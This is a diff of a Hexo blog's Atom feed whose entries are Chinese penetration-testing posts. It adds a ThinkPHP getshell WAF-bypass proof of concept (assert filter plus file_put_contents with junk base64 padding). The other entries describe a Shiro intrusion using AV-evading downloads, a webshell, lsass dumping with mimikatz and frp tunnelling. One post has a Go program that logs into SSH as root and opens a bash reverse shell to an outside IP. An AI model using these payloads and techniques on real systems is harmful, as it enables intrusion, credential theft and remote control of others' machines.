@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-10-06T01:51:17.418Z</updated>
+  <updated>2024-11-18T12:40:07.621Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,35 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ThinkPHP GetShell WAF绕过</title>
+    <link href="http://example.com/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/"/>
+    <id>http://example.com/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/</id>
+    <published>2024-11-18T12:38:34.000Z</published>
+    <updated>2024-11-18T12:40:07.621Z</updated>
+    
+    <content type="html"><![CDATA[<p>分享一个ThinkPHP GetShell时WAF绕过的小技巧</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>以如下POC为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha&amp;test=-1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&#x27;system.php&#x27;,&#x27;&lt;?php phpinfo();&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><p>可能绕过WAF的POC为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha&amp;test=-1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&#x27;system.php&#x27;,&#x27;&lt;?php file_put_contents(&quot;todoback.php&quot;,base64_decode(&quot;垃圾字符&quot;));?&gt;&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/01.png" alt="image"><br>官方文档中提到，使用base64_decode解码但不指定第二个参数$strict时，base64字符集以外的字符将被忽略，由此我们可以利用它来插入大量垃圾字符</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>Ubuntu22.04 + 宝塔（Nginx1.24.0 + PHP5.6.40）</p><p>先测试合法base64字符，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==&#x27;;</span><br><span class="line">echo base64_decode($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/02.png" alt="image">  </p><p>测试插入非法base64字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==***&#x27;;</span><br><span class="line">echo base64_decode($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/03.png" alt="image">  </p><p>测试插入100万个非法base64字符，python脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;a.txt&quot;, &quot;w&quot;) as fw:</span><br><span class="line">    for i in range(1000000):</span><br><span class="line">        fw.write(&quot;*&quot;)</span><br></pre></td></tr></table></figure><p>代码如下<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/04.png" alt="image"><br>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/05.png" alt="image">  </p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;分享一个ThinkPHP GetShell时WAF绕过的小技巧&lt;/p&gt;
+&lt;h1 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h1&gt;&lt;p&gt;以如下POC为例&lt;/p&gt;
+&lt;figure class=</summary>
+      
+    
+    
+    
+    
+    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
+    
+  </entry>
+  
+  <entry>
     <title>从shiro命令执行到远程桌面登录</title>
     <link href="http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/"/>
     <id>http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/</id>
     <published>2024-10-06T01:32:57.000Z</published>
-    <updated>2024-10-06T01:51:17.418Z</updated>
+    <updated>2024-11-18T12:41:44.402Z</updated>
     
     <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内存马不是我的研究方向，从文件下载方向突破</p><h1 id="0x01-突破"><a href="#0x01-突破" class="headerlink" title="0x01 突破"></a>0x01 突破</h1><p>常规的文件下载方式bitsadmin、certutil、ftp等均被拦截，掏出储备的一个免杀的文件下载方式，可成功下载exe文件，尝试下载免杀远控并执行，发现无法执行（原因未知），改为下载魔改过的免杀冰蝎到对应的web目录下，成功连接webshell</p><h1 id="0x02-再突破"><a href="#0x02-再突破" class="headerlink" title="0x02 再突破"></a>0x02 再突破</h1><p>连接上webshell后，尝试执行远控仍旧失败，看来这条路行不通了，上传procdump抓取lsass的内存，想要下载到本地解密，发现不能下载（猜测可能是AV给拦截了），重新梳理下场景，想到既然是shiro的站点，那可以通过web服务下载文件，将文件移动到web目录后成功下载，随后通过mimikatz解出密码，密码真TM复杂啊，上传魔改过的免杀frp，建立隧道后，远程桌面成功连接</p><h1 id="0x03-优化"><a href="#0x03-优化" class="headerlink" title="0x03 优化"></a>0x03 优化</h1><p>远程桌面连接后，发现屏幕字体非常非常小，应该是我本机虚拟机的分辨率太高导致的，此时可以先修改本机的屏幕分辨率，再远程桌面连接后大小刚刚好，但是本机字体会非常非常大，且通过Win10自带的mstsc连接Windows Server 2008 R2时，是不能将密码拷贝到登录界面中，如果密码很复杂的话，不仅费力还容易出错，这里推荐使用UWP版本的远程桌面，可以先设置用户名密码再连接，也就是可以粘贴密码，在紧张的攻防中提供一些便利~</p>]]></content>
     
@@ -34,7 +58,7 @@
     
     
     
-    <category term="渗透攻防" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2/"/>
+    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
     
   </entry>
   
@@ -66,7 +90,7 @@
     <link href="http://example.com/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
     <id>http://example.com/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
     <published>2024-07-15T08:47:10.000Z</published>
-    <updated>2024-10-06T01:53:36.138Z</updated>
+    <updated>2024-11-18T12:43:05.518Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>接到一个Android APP渗透的任务，尝试用模拟器抓包发现闪退，看来反模拟器，手里有一台手机，型号是OPPO A57 5G，系统是ColorOS 14，手机和电脑在同一WiFi下，安装好burp证书，配置好代理，尝试抓包，发现无法抓取https包，好吧，开启折腾之旅</p><p>oppo安装证书<br><a href="https://www.cnblogs.com/tianpin/p/17503604.html">https://www.cnblogs.com/tianpin/p/17503604.html</a>  </p><h1 id="0x02-手机降级"><a href="#0x02-手机降级" class="headerlink" title="0x02 手机降级"></a>0x02 手机降级</h1><p>查阅相关资料得知，安卓7.0开始，想抓https包需要将证书装到系统证书目录下，想装到系统证书目录下需要root权限，现在问题变成如何root</p><p>之前手欠将ColorOS升级到14，我们都知道版本越高越不利于root，所以第一步是降级，ColorOS官方规定，降级需要一级一级降，不能一次降多级，所以我们要先降到ColorOS 13，再降到ColorOS 12，由于ColorOS最低只能降到手机出厂时的系统，我这边最低只能降到ColorOS 12</p><p>ColorOS 14降级到ColorOS 13<br><a href="https://www.ithome.com/0/742/497.htm">https://www.ithome.com/0/742/497.htm</a><br>ColorOS 13降级到ColorOS 12<br><a href="https://bbs.oneplus.com/thread/6387108">https://bbs.oneplus.com/thread/6387108</a>  </p><h1 id="0x03-Root准备"><a href="#0x03-Root准备" class="headerlink" title="0x03 Root准备"></a>0x03 Root准备</h1><p>首先复习了一下adb、recovery、fastboot的知识，然后手机连上电脑，开启USB调试，尝试通过adb和fastboot连接手机，发现没有fastboot命令，下载Android Studio的SDK，里面的platform-tools目录下有我们需要的工具（像夜神模拟器安装目录下也有adb，但是没有fastboot）</p><p>adb连接手机<br><a href="https://blog.csdn.net/qq_42864343/article/details/123813339">https://blog.csdn.net/qq_42864343/article/details/123813339</a><br>使用fastboot命令刷机流程详解<br><a href="https://blog.csdn.net/s13383754499/article/details/82755012">https://blog.csdn.net/s13383754499/article/details/82755012</a><br>oppo开启usb调试<br><a href="https://baijiahao.baidu.com/s?id=1750732106730743094&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1750732106730743094&amp;wfr=spider&amp;for=pc</a><br>【2021】解决 Android Studio下载SDK失败 问题<br><a href="https://blog.csdn.net/weixin_43461724/article/details/120706675">https://blog.csdn.net/weixin_43461724/article/details/120706675</a>  </p><h1 id="0x04-成功Root"><a href="#0x04-成功Root" class="headerlink" title="0x04 成功Root"></a>0x04 成功Root</h1><p>查阅大量文章尝试root，发现OPPO A57 5G无法解锁BootLoader</p><p>oppo手机root<br><a href="https://www.shoujiroot.com/archives/146545.html">https://www.shoujiroot.com/archives/146545.html</a><br><a href="https://www.thenextdroid.com/oppo-a56s-root-without-pc-via-magisk/">https://www.thenextdroid.com/oppo-a56s-root-without-pc-via-magisk/</a>  </p><p>oppo a57刷机<br><a href="https://www.cnblogs.com/feiquan/p/9055823.html">https://www.cnblogs.com/feiquan/p/9055823.html</a><br><a href="https://blog.csdn.net/xgocn/article/details/107565522">https://blog.csdn.net/xgocn/article/details/107565522</a><br><a href="http://www.romgw.com/?p=334">http://www.romgw.com/?p=334</a>  </p><p>期间尝试刷机时碰到一个问题，我是mac系统下pd虚拟化的win10，无法将串口设备挂接到虚拟机，如下图<br><img src="/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/01.png" alt="image">  </p><p>经历各种失败后，已经打算放弃了，想想再试一次万能的淘宝吧，搜了一下，还真有刷机业务并且可以刷OPPO A57 5G，不过mac系统下pd虚拟化的win10不行，需要物理机win10，然后又找了一台物理机win10，全程需要对方远程控制我电脑，很反感别人控制我电脑，好在那台物理机win10上面啥数据也没有，看对面一顿操作，最后成功root</p><p>通过观察他们的操作，发现他们其实是用的一款第三方付费工具UnlockTool，好像是一个越南团队开发的，这款工具其中一个root方式是利用联发科这款CPU的一个漏洞，正好OPPO A57 5G的CPU就是联发科</p><h1 id="0x05-成功抓包"><a href="#0x05-成功抓包" class="headerlink" title="0x05 成功抓包"></a>0x05 成功抓包</h1><p>手机root后成功安装了magisk，但是adb连接后权限还是shell，无法将证书装到系统证书目录下，尝试过Root Explorer，但是无法修改证书权限，最终通过magisk的模块MoveCertiticate成功将证书移到系统证书目录下，需要注意MoveCertiticate会从指定目录将证书移到系统证书目录下，所以需要先将证书放到/data/local/tmp/cert/下</p><p>另外有些app出于反调试目的，可能不走系统本身的代理，需要一款类似Proxifier的全局代理客户端，可以使用Postern</p><p>一切准备就绪后，尝试抓包，可成功抓到app的https包，如下图<br><img src="/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/02.png" alt="image">  </p><p>移动端抓包<br><a href="https://xz.aliyun.com/t/11817?time__1311=Cq0xuD07u4lh=iQwYYv3iIPx7qEYoD">https://xz.aliyun.com/t/11817?time__1311=Cq0xuD07u4lh%3DiQwYYv3iIPx7qEYoD</a><br><a href="https://blog.csdn.net/Arched/article/details/135777104">https://blog.csdn.net/Arched/article/details/135777104</a><br><a href="https://github.com/ys1231/MoveCertificate">https://github.com/ys1231/MoveCertificate</a>  </p><h1 id="0x06-总结感悟"><a href="#0x06-总结感悟" class="headerlink" title="0x06 总结感悟"></a>0x06 总结感悟</h1><p>之前一直有一个问题，可以直接通过burp抓包，为何还要再通过charles或者fiddler中转一下，这次正好测试了一下，发现直接通过burp抓包，数据包从APP到burp需要好几秒，有点慢，而通过charles中转一下，则可以秒抓</p><p>最后，其实iOS下导入证书就可以抓https包，比Android省事多，所以条件允许的话，优先在iOS下抓包，但是像我这种没有iOS客户端的情况，就得折腾了~</p>]]></content>
     
@@ -79,7 +103,7 @@
     
     
     
-    <category term="渗透攻防" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2/"/>
+    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
     
   </entry>
   
@@ -88,7 +112,7 @@
     <link href="http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/"/>
     <id>http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/</id>
     <published>2024-05-07T13:35:51.000Z</published>
-    <updated>2024-10-06T01:51:04.909Z</updated>
+    <updated>2024-11-18T12:43:32.383Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-应用场景"><a href="#0x01-应用场景" class="headerlink" title="0x01 应用场景"></a>0x01 应用场景</h1><p>一个命令执行的口子</p><p>主机不出网</p><p>当前是nobody权限，web目录是root权限，写webshell没权限</p><p>通过一个ctf技巧搞了一个webshell，能上传文件但是不能执行命令</p><p>通过webshell将fscan上传到/tmp目录下，通过入口的命令执行漏洞执行fscan，发现内网有ssh弱口令</p><h1 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h1><p>已知连接ssh的同时可以执行命令<br><img src="/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/image-20230731085919496.png" alt="image"><br>当时的想法是连接ssh，然后执行命令反弹shell，但是连接ssh需要交互式shell，第一时间想到expect，经测试主机上没有expect，然后想到通过python中的pexpect去做这件事，发现目标中的python缺少依赖，如果上传python依赖到对应的依赖库目录太麻烦了，最后想到用go去实现，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line"></span><br><span class="line">&quot;golang.org/x/crypto/ssh&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">username = &quot;root&quot;</span><br><span class="line">password = &quot;P@ssw0rd!&quot;</span><br><span class="line">addr     = &quot;10.62.139.19:22&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">config := &amp;ssh.ClientConfig &#123;</span><br><span class="line">User: username,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.Password(password),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client, err := ssh.Dial(&quot;tcp&quot;, addr, config)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to dial: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer client.Close()</span><br><span class="line"></span><br><span class="line">// 开启一个session，用于执行一个命令</span><br><span class="line">session, err := client.NewSession()</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to create session: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"></span><br><span class="line">// 执行命令，并将执行的结果写到 b 中</span><br><span class="line">var b bytes.Buffer</span><br><span class="line">session.Stdout = &amp;b</span><br><span class="line"></span><br><span class="line">// 也可以使用 session.CombinedOutput() 整合输出</span><br><span class="line">if err := session.Run(&quot;bash -i &gt;&amp; /dev/tcp/123.249.104.83/1234 0&gt;&amp;1&quot;); err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to run: &quot; + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(b.String())  // root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实是在赌目标主机出网，盲打成功接收到反弹shell那一刻，还是挺爽的~</p>]]></content>
     
@@ -103,7 +127,7 @@
     
     
     
-    <category term="渗透攻防" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2/"/>
+    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
     
   </entry>
   
